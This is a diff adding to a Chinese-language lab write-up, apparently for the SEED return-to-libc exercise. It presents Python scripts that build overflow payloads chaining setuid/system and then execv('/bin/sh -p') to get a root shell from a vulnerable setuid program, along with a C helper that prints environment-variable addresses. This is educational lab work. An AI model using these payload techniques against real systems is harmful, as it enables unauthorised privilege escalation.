@@ -192,6 +192,8 @@ with open("badfile", "wb") as f:
 
 ```
 
+运行得到root shell：
+
 ```
 $ ./retlib 
 Address of input[] inside main():  0xffffce00
@@ -207,15 +209,9 @@ Frame Pointer value inside bof():  0xffffcde8
 
 之前我们手动将sh指向zsh，这个任务中我们需要通过`sudo ln -sf /bin/dash /bin/sh`将sh指向dash，之后攻破dash的防御机制
 
+## 一个失败的尝试法
 
-
-setuid的地址：0xf7e98e30
-
-system地址：0xf7e11420
-
-/bin/sh字符串的地址：ffffd45d
-
-对栈帧进行覆盖：
+对栈帧进行覆盖，下面顺序是从高地址到低地址的方向：
 
 ```
 /bin/sh字符串的地址，也即是system()函数的参数
@@ -224,9 +220,115 @@ system()的地址
 setuid()的地址
 ```
 
+计算一下地址：
+
+- setuid的地址：0xf7e98e30
+- system地址：0xf7e11420
+- /bin/sh字符串的地址：ffffd466
+
+写个py脚本：
+
+```python
+#!/usr/bin/env python3
+import sys
+
+# Fill content with non-zero values
+content = bytearray(0xaa for i in range(300))
+
+A  = 40
+sh_addr =     0xffffd465   # The address of "/bin/sh"
+content[A:A+4] = (sh_addr).to_bytes(4,byteorder='little')
+
+B = 36
+zero_addr = 0        # 0 
+content[B:B+4] = (zero_addr).to_bytes(4,byteorder='little')
+
+C = 32
+system_addr = 0xf7e11420  # The address of system()
+content[C:C+4] = (system_addr).to_bytes(4,byteorder='little')
+
+D = 28
+setuid_addr = 0xf7e98e30  # The address of setuid()
+content[D:D+4] = (setuid_addr).to_bytes(4,byteorder='little')
+
+# Save content to a file
+with open("badfile", "wb") as f:
+  f.write(content)
+```
+
+攻击失败了，因为bof中strcpy函数遇到上面代码中B=36处的0会导致截断
+
+## 一个成功的尝试
+
+存在这样一个机制：如果是/bin/sh -p，那么不会放弃特权，因此我们需要触发`int execv(const char *pathname, char *const argv[]);`
+
+- pathname就是`/bin/sh`
+- argv[0]是`/bin/sh`，argv[1]是`-p`，argv[2]是0
+
+为了编写exploit.py，我们需要做如下工作：
+
+- export环境变量，并打印出字符串的地址
+
+```c
+#include<stdio.h>
+void main()
+{
+        char *shell=getenv("MYSHELL");
+        char *p=getenv("P");
+        if(shell)
+                printf("%x\n",(unsigned int)shell);
+        if(p)
+                printf("%x\n",(unsigned int)p);
+}
+```
+
+- 使用gdb找到execv函数与exit函数的地址
+- 组织payload字符串
+
+```python
+#!/usr/bin/env python3
+import sys
+
+# Fill content with non-zero values
+content = bytearray(0xaa for i in range(300))
+
+Z = 0x120+8
+zero_addr = 0				# The address of "NULL"
+content[Z:Z+4] = (zero_addr).to_bytes(4,byteorder='little')
 
 
+X = 0x120+4
+p_addr =    0xffffd6d7        # The address of "-p"
+content[X:X+4] = (p_addr).to_bytes(4,byteorder='little')
 
+Y = 0x120
+sh_addr1 = 0xffffd461         # The address of "/bin/bash" argv[0]
+content[Y:Y+4] = (sh_addr1).to_bytes(4,byteorder='little')
 
+A = 40
+addr = 0xffffce00+0x120         # point to pointer 
+content[A:A+4] = (addr).to_bytes(4,byteorder='little')
 
+# above : start of argv[]
 
+B = 36
+sh_addr = 0xffffd461       # The address of "/bin/bash"
+content[B:B+4] = (sh_addr).to_bytes(4,byteorder='little')
+
+C = 32
+exit_addr = 0xf7e03f80  # The address of exit()
+content[C:C+4] = (exit_addr).to_bytes(4,byteorder='little')	
+
+D = 28
+execv_addr = 0xf7e984b0  # The address of execv()
+content[D:D+4] = (execv_addr).to_bytes(4,byteorder='little')
+
+# Save content to a file
+with open("badfile", "wb") as f:
+  f.write(content)
+
+```
+
+这里卡了很久，因为我在构建argv[]的时候，一直选择紧邻exit函数的地方，这样input的缓冲区可能会被buffer覆盖，感谢https://munian.life/2022/04/07/SeedLab2.0-Buffer-Overflow/这篇博客，提醒了我要在较远地址处构建缓冲区内容
+
+![](https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/image_2.png)
